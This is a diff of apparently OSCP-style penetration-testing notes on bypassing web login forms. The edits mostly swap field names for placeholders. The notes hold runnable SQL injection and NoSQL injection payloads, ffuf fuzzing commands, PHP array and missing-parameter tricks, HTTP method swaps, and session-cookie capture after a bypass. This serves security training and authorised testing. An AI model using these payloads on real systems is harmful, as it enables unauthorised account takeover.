@@ -1,8 +1,6 @@
 
 Bypass login without valid credentials — via injection payloads, request tampering, or exploiting server-side auth check flaws. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation.
 
-Sister files: [[Credential Attacks]] (default creds, brute force, stuffing, spray), [[Session Cookie Attacks]] (session/JWT), [[Password Reset Attacks]], [[Registration Attacks]], [[MFA Bypass]].
-
 Ordering: cheap-and-visible first (HTML comments — seconds); injection payload lists (fast, high P on OSCP+ SQLi-vulnerable apps); parameter tampering (fast, defeats naive parsers); direct URL access (fast, defeats routes-only-protected-in-frontend apps); custom header bypass (medium cost, discovery-dependent); HTTP method tampering; case-sensitivity path bypass; HTTP Basic Auth handling.
 
 ---
@@ -38,7 +36,7 @@ Submit injection payloads as username, password, or both. Bypasses vulnerable lo
 ```bash
 while IFS=: read -r u p; do
   echo -n "$u | $p → "
-  curl -sX POST -d "username=$(printf %s "$u" | jq -sRr @uri)&password=$(printf %s "$p" | jq -sRr @uri)" http://<host>:<port>/<login_path> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
+    curl -sX POST -d "<login_username_field>=$(printf %s "$u" | jq -sRr @uri)&<login_password_field>=$(printf %s "$p" | jq -sRr @uri)" http://<host>:<port>/<login_form_action> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
 done << 'EOF'
 admin' -- :anything
 admin' # :anything
@@ -57,11 +55,11 @@ EOF
 
 **Full payload list (large).** HackTricks curated list — try as username field with fixed password `Pass1234`, then swap:
 
-`ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -X POST -d 'username=FUZZ&password=Pass1234' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads>`
+`ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -X POST -d '<login_username_field>=FUZZ&<login_password_field>=Pass1234' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads>`
 
 Then reverse (fixed username, fuzz password):
 
-`ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads>`
+`ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -X POST -d '<login_username_field>=admin&<login_password_field>=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_form_action> -fr '<fail_signal>' -t <threads>`
 
 **LDAP injection (if backend suspected to use LDAP — Active Directory-integrated apps):**
 
@@ -84,30 +82,30 @@ Exploit parser quirks in the login form's expected parameters.
 
 **JSON boolean bypass (Node.js / Express commonly).** Change Content-Type to `application/json`, send boolean values:
 
-`curl -sX POST -H 'Content-Type: application/json' -d '{"username":"admin","password":true}' -i http://<host>:<port>/<login_path>`
+`curl -sX POST -H 'Content-Type: application/json' -d '{"<login_username_field>":"admin","<login_password_field>":true}' -i http://<host>:<port>/<login_form_action>`
 
 Variations:
 
-- `{"password":{"$ne":null}}` (NoSQL/MongoDB)
-- `{"password":{"$gt":""}}` (NoSQL)
-- `{"password":{"password":1}}` (Node.js/mysqljs — makes password comparison always-true)
+- `{"<login_password_field>":{"$ne":null}}` (NoSQL/MongoDB)
+- `{"<login_password_field>":{"$gt":""}}` (NoSQL)
+- `{"<login_password_field>":{"password":1}}` (Node.js/mysqljs — makes password comparison always-true)
 
 **Array/dict parameter bypass (PHP loose comparison).**
 
-- `username[]=admin&password=x` (username becomes array)
-- `username=admin&password[]=x` (password becomes array — may bypass strcmp)
-- `username[]=admin&password[]=x` (both arrays)
+- `<login_username_field>[]=admin&<login_password_field>=x` (username becomes array)
+- `<login_username_field>=admin&<login_password_field>[]=x` (password becomes array — may bypass strcmp)
+- `<login_username_field>[]=admin&<login_password_field>[]=x` (both arrays)
 
 **Missing parameter bypass.**
 
-- `username=admin` (password field entirely absent)
-- `password=x` (username field entirely absent)
-- `username=admin&password=` (password empty)
+- `<login_username_field>=admin` (password field entirely absent)
+- `<login_password_field>=x` (username field entirely absent)
+- `<login_username_field>=admin&<login_password_field>=` (password empty)
 
 **HTTP method swap.** Some apps only guard POST; GET or PUT may reach a different handler:
 
-`curl -s -i 'http://<host>:<port>/<login_path>?username=admin&password=x'` (GET)
-`curl -sX PUT -d 'username=admin&password=x' -i http://<host>:<port>/<login_path>` (PUT)
+`curl -s -i 'http://<host>:<port>/<login_form_action>?<login_username_field>=admin&<login_password_field>=x'` (GET)
+`curl -sX PUT -d '<login_username_field>=admin&<login_password_field>=x' -i http://<host>:<port>/<login_form_action>` (PUT)
 `curl -sX TRACE -i http://<host>:<port>/<login_path>` (TRACE — may echo request headers, useful for header enumeration)
 
 **Content-Type mismatch.** Send POST body as JSON but claim form-urlencoded, or vice versa.
@@ -247,7 +245,7 @@ On verified bypass (session cookie, authenticated content, or direct-access foot
 
 2. Capture session state (cookie, header, path — whatever grants the authenticated context):
 
-    `curl -sX POST -i -d '<payload>' http://<host>:<port>/<login_path> | grep -iE '^(Set-Cookie|Location):'`
+	`curl -sX POST -i -d '<payload>' http://<host>:<port>/<login_form_action> | grep -iE '^(Set-Cookie|Location):'`
 
 3. Route by post-bypass surface:
 
